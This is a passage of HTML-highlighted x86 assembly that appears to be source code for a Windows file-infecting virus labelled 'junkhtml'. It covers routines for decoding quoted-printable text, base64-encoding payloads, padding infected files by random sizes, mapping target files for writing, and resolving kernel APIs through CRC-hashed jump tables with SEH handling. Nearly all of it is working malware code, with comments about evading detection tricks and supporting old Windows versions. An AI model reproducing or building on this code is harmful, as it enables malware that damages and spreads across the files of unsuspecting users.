        </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">69h</span><span class="sc0">
        </span><span class="sc6">das</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ah</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">69h</span><span class="sc0">
        </span><span class="sc6">das</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">

</span><span class="sc5">octet_skip</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">octet_check</span><span class="sc0">

</span><span class="sc5">octet_copy</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movs</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">octet_eqcrlf</span><span class="sc0">    </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">movs</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">octet_crlf</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">movs</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">octet_line</span><span class="sc0">

</span><span class="sc5">octet_break</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0a0d3dh</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">octet_line</span><span class="sc0">
</span><span class="sc5">decompoct</span><span class="sc0">       </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">bound_copy</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movs</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">store_crlf</span><span class="sc0">
</span><span class="sc5">bound_copy</span><span class="sc0">      </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">decomptype</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">

</span><span class="sc5">patch_type</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'RTF!'</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decompcmap</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">part12</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">part11</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">decomptype</span><span class="sc0">      </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;base64 encoder without dictionary by RT Fishel</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">b64_newline</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">store_crlf</span><span class="sc0">

</span><span class="sc5">b64encode</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">                    </span><span class="sc1">;ebp = length, esi -&gt; src buffer, edi -&gt; dst buffer</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc2">76</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">b64_outer</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">b64_newline</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">bswap</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">b64_inner</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3fh</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3eh</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">b64_testchar</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                           </span><span class="sc1">;'+' and '/' differ by only 1 bit</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc2">3eh</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc12">'A'</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc12">'+'</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">

</span><span class="sc5">b64_testchar</span><span class="sc0">    </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'0'</span><span class="sc0">
        </span><span class="sc6">jnl</span><span class="sc0">     </span><span class="sc5">b64_store</span><span class="sc0">                       </span><span class="sc1">;l not b because '/' is still &lt; 0 here</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'A'</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'Z'</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">b64_store</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'a'</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc12">'Z'</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">b64_store</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">loopne</span><span class="sc0">  </span><span class="sc5">b64_inner</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">b64_outer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'='</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stos</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">b64_newline</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;increase file size by random value (between RANDPADMIN and RANDPADMAX bytes)</span><span class="sc0">
</span><span class="sc1">;I use GetTickCount() instead of RDTSC because RDTSC can be made privileged</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">open_append</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">krncrcstk.kGetTickCount</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">krncrcstk.klstrlenW</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">store_krnapi</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">RANDPADMAX</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">small</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">junkhtml_codeend</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">junkhtml_inf</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">RANDPADMIN</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;create file map, and map view if successful</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">map_view</span><span class="sc0">        </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">                    </span><span class="sc1">;eax = extra bytes to map, ebx = file handle, esi -&gt; findlist, ebp -&gt; platform APIs</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">findlist.finddata.dwFileSizeLow</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;MapViewOfFile</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">;MapViewOfFile</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">;MapViewOfFile</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_MAP_WRITE</span><span class="sc0">                  </span><span class="sc1">;Windows 9x/Me does not support FILE_MAP_ALL_ACCESS</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">krncrcstk.kCreateFileMappingA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">krncrcstk.klstrlenW</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;ANSI map is allowed because of no name</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">store_krnapi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">krncrcstk.kMapViewOfFile</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">krncrcstk.klstrlenW</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">store_krnapi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">;should succeed even if file cannot be opened</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">unmap_seh</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">                                   </span><span class="sc1">;SEH destroys all registers</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">krncrcstk.kUnmapViewOfFile</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">krncrcstk.klstrlenW</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">store_krnapi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cCloseHandle</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">unmap_seh</span><span class="sc0">       </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">cdq</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mapsehstk.mapsehsehret</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">unmap_seh</span><span class="sc0">       </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc5">map_view</span><span class="sc0">        </span><span class="sc9">endp</span><span class="sc0">                            </span><span class="sc1">;eax = map handle, ecx = new file size, edi = map view</span><span class="sc0">
</span><span class="sc5">open_append</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;determine platform and dynamically select function types (ANSI or Unicode)</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">get_krnapis</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">                    </span><span class="sc1">;place near to jump table for smaller code</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cGetVersion</span><span class="sc0">

</span><span class="sc5">krnapi_delta</span><span class="sc0">    </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1fh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;no stack change in ring 3</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">store_krnapi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">krnapi_delta</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">get_krnapis</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;indexed API jump table</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">clstrcatW</span><span class="sc0">               </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">krncrcstk.klstrcatW</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">krncrcstk.klstrlenW</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">call_krncrc</span><span class="sc0">
</span><span class="sc5">clstrcatW</span><span class="sc0">               </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">cSleep</span><span class="sc0">                  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">krncrcstk.kSleep</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">krncrcstk.klstrlenW</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">call_krncrc</span><span class="sc0">
</span><span class="sc5">cSleep</span><span class="sc0">                  </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">cSetCurrentDirectoryA</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">krncrcstk.kSetCurrentDirectoryA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">krncrcstk.klstrlenW</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">call_krncrc</span><span class="sc0">
</span><span class="sc5">cSetCurrentDirectoryA</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">cLoadLibraryA</span><span class="sc0">           </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">krncrcstk.kLoadLibraryA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">krncrcstk.klstrlenW</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">call_krncrc</span><span class="sc0">
</span><span class="sc5">cLoadLibraryA</span><span class="sc0">           </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">cGlobalFree</span><span class="sc0">             </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
